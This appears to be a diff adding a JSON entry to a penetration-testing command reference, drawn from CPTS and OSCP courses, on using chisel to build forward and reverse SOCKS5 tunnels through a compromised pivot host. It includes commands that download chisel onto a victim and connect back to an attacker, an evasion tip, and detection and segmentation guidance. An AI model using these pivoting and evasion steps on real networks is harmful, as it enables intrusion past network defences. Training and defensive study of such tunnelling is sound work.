@@ -1,0 +1,159 @@
+{
+  "id": "chisel-socks",
+  "name": "Chisel - SOCKS5 Tunnel",
+  "command": "./chisel server -v -p <port> --socks5",
+  "description": "Chisel builds a SOCKS5 tunnel over HTTP through a firewall. Forward mode: run the server on the pivot and the client on the attack host. Reverse mode: run the server on the attack host (--reverse) and the client on the pivot with R:socks. Both expose a proxy on 127.0.0.1:1080.",
+  "platform": "linux",
+  "requires": [
+    "shell"
+  ],
+  "protocols": [
+    "tcp"
+  ],
+  "tools": [
+    "chisel"
+  ],
+  "tags": [
+    "chisel",
+    "socks",
+    "tunnel",
+    "pivoting"
+  ],
+  "category": "Pivoting & Tunneling",
+  "subcategory": "SOCKS Tunneling",
+  "certifications": [
+    "CPTS",
+    "OSCP"
+  ],
+  "primary_cert": "CPTS",
+  "source": "CPTS Module 12: Pivoting, Tunneling, and Port Forwarding",
+  "examples": [
+    {
+      "label": "./chisel example",
+      "command": "./chisel server -v -p 1234 --socks5"
+    },
+    {
+      "label": "./chisel example",
+      "command": "./chisel client -v 10.129.202.64:1234 socks"
+    },
+    {
+      "label": "sudo example",
+      "command": "sudo ./chisel server --reverse -v -p 1234 --socks5"
+    },
+    {
+      "label": "./chisel example",
+      "command": "./chisel client -v 10.10.14.17:1234 R:socks"
+    },
+    {
+      "label": "OSCP Ch19 \u2014 serve chisel binary via Apache on Kali",
+      "command": "sudo cp $(which chisel) /var/www/html/\nsudo systemctl start apache2"
+    },
+    {
+      "label": "OSCP Ch19 \u2014 download chisel to victim and make executable",
+      "command": "wget <kali_ip>/chisel -O /tmp/chisel && chmod +x /tmp/chisel"
+    },
+    {
+      "label": "OSCP Ch19 \u2014 reverse server on Kali (port 8080, --reverse creates SOCKS on 127.0.0.1:1080)",
+      "command": "chisel server --port 8080 --reverse"
+    },
+    {
+      "label": "OSCP Ch19 \u2014 reverse SOCKS client on pivot (R:socks = SOCKS5 listener on Kali 1080)",
+      "command": "/tmp/chisel client <kali_ip>:8080 R:socks"
+    },
+    {
+      "label": "OSCP Ch19 \u2014 verify chisel SOCKS listener appeared on Kali",
+      "command": "ss -ntplu | grep 1080"
+    },
+    {
+      "label": "OSCP Ch19 \u2014 SSH through chisel SOCKS via ncat ProxyCommand",
+      "command": "ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' <user>@<internal_ip>"
+    }
+  ],
+  "notes": "Add 'socks5 127.0.0.1 1080' to /etc/proxychains.conf, then run tools with proxychains. Reverse mode helps when the pivot cannot accept inbound connections. Also covered in: OSCP PEN-200 Chapter 19 (Tunneling Through Deep Packet Inspection). OSCP Ch19: chisel wraps traffic in HTTP to bypass DPI \u2014 key when SSH and raw TCP are filtered but HTTP/HTTPS outbound is allowed. Reverse mode (--reverse on server, R:socks on client): client connects OUT from the pivot to Kali, and Kali exposes a SOCKS5 proxy on 127.0.0.1:1080. No --socks5 flag needed on the server in reverse mode \u2014 R:socks on the client is sufficient. After tunnel is up, use ncat ProxyCommand to SSH directly to internal hosts through the SOCKS5 proxy without separate proxychains config.",
+  "references": [
+    {
+      "title": "HTB Academy - Pivoting, Tunneling, and Port Forwarding",
+      "url": "https://academy.hackthebox.com/module/details/158"
+    },
+    {
+      "title": "chisel",
+      "url": "https://github.com/jpillora/chisel"
+    },
+    {
+      "title": "OffSec PEN-200 - Tunneling Through Deep Packet Inspection",
+      "url": "https://www.offsec.com/courses/pen-200/"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "proxychains-run",
+      "note": "Forces a tool's TCP traffic through a configured SOCKS/HTTP proxy (a pivot's SSH -D tunnel, an MSF socks_proxy, chisel, etc.).",
+      "rel": "next"
+    }
+  ],
+  "variations": [
+    {
+      "label": "Forward - Server (pivot)",
+      "command": "./chisel server -v -p <port> --socks5"
+    },
+    {
+      "label": "Forward - Client (attacker)",
+      "command": "./chisel client -v <pivot_ip>:<port> socks"
+    },
+    {
+      "label": "Reverse - Server (attacker)",
+      "command": "sudo ./chisel server --reverse -v -p <port> --socks5"
+    },
+    {
+      "label": "Reverse - Client (pivot)",
+      "command": "./chisel client -v <attacker_ip>:<port> R:socks"
+    }
+  ],
+  "opsec": "quiet",
+  "mitre": [
+    "T1090.001"
+  ],
+  "steps": [
+    {
+      "label": "Download the chisel binary (attacker)",
+      "command": "wget https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz && gunzip chisel_1.9.1_linux_amd64.gz && mv chisel_1.9.1_linux_amd64 chisel"
+    },
+    {
+      "label": "Copy chisel to the pivot host",
+      "command": "scp chisel <user>@<pivot_ip>:~/"
+    },
+    {
+      "label": "Attacker: start the reverse server",
+      "command": "./chisel server --reverse -p <port> --socks5"
+    },
+    {
+      "label": "Pivot: connect back as a reverse SOCKS client",
+      "command": "./chisel client <lhost>:<port> R:socks"
+    },
+    {
+      "label": "Point proxychains at the SOCKS port",
+      "command": "echo 'socks5 127.0.0.1 1080' | sudo tee -a /etc/proxychains.conf"
+    },
+    {
+      "label": "Route a tool through the tunnel",
+      "command": "proxychains nmap -sT -Pn <internal_target>"
+    }
+  ],
+  "exam": "exam-ok",
+  "defense": {
+    "why_it_works": "chisel creates a fast TCP/UDP tunnel over HTTP(S) (client/server), commonly used to build a SOCKS proxy through a pivot where SSH isn't available.",
+    "prerequisites": "The chisel binary on both ends and an allowed outbound path (often 443) from the pivot.",
+    "impact": "A SOCKS proxy / port-forward over HTTP(S) into internal networks - works through web-only egress.",
+    "detection": "[MITRE T1090.001] A compromised host relaying traffic between segments it shouldn't bridge; an unexpected listening port (SOCKS/forwarder) on the pivot; the pivot initiating connections to hosts/ports it never normally contacts; lateral flows that appear to originate from the pivot (NetFlow/east-west monitoring).",
+    "artifacts": "The chisel process on the pivot; an HTTP(S) tunnel to the attacker; a SOCKS listener.",
+    "prevention": "[MITRE T1090.001 M1030 Network Segmentation] strict east-west firewall rules so one foothold can't reach other segments; egress filtering; IDS/IPS + NetFlow analysis for proxy patterns and long-lived flows; alert on unexpected listeners on servers.",
+    "evasion": "Tunnel over an allowed protocol/port (443) and encrypt the channel so the relay blends with normal traffic; keep the listener on a common-looking port.",
+    "sources": [
+      "HTB M12",
+      "MITRE T1090.001"
+    ],
+    "misconfiguration": "The network lacks proper segmentation \u2014 a compromised DMZ host has direct layer-3 reachability to internal infrastructure (database servers, DCs, internal admin panels). No egress filtering blocks outbound HTTP/HTTPS connections to arbitrary hosts, allowing C2 channels and reverse tunnels. Internal firewalls only filter inbound traffic, not east-west or outbound.",
+    "vulnerable_config": "# Network design: flat Layer-3 network, all VLANs can reach each other\n# DMZ web server can ping/connect to: 10.10.10.0/24 (internal LAN), 10.10.20.0/24 (DB subnet)\n# No egress proxy \u2014 direct outbound HTTP to any IP allowed\n\n# iptables on pivot host (none blocking outbound):\niptables -L OUTPUT  # policy ACCEPT, no rules\n\n# This allows: chisel client 10.10.10.5:8080 R:socks\n# Attacker now has SOCKS5 access to the entire internal network",
+    "secure_config": "# Network segmentation with explicit allow rules:\n# DMZ -> Internet: only specific egress IPs (patch servers, DNS)\n# DMZ -> Internal: ONLY the DB ports this specific app needs\n# Internal -> Internal: segment by tier (web tier can't reach DC directly)\n\n# Egress filtering \u2014 block all outbound except known-good:\n# FortiGate / Palo Alto / iptables:\niptables -P OUTPUT DROP\niptables -A OUTPUT -d 8.8.8.8 -p udp --dport 53 -j ACCEPT  # DNS to specific server\niptables -A OUTPUT -p tcp --dport 443 -d <known_update_servers> -j ACCEPT\niptables -A OUTPUT -m state --state ESTABLISHED,RELATED -j ACCEPT\n\n# IDS/IPS signatures for Chisel, ngrok, frp traffic patterns\n# DNS monitoring \u2014 detect DNS tunneling (dnscat2) via unusual query frequency/length\n# HTTP proxy with TLS inspection \u2014 detect reverse tunnels in HTTPS streams"
+  }
+}
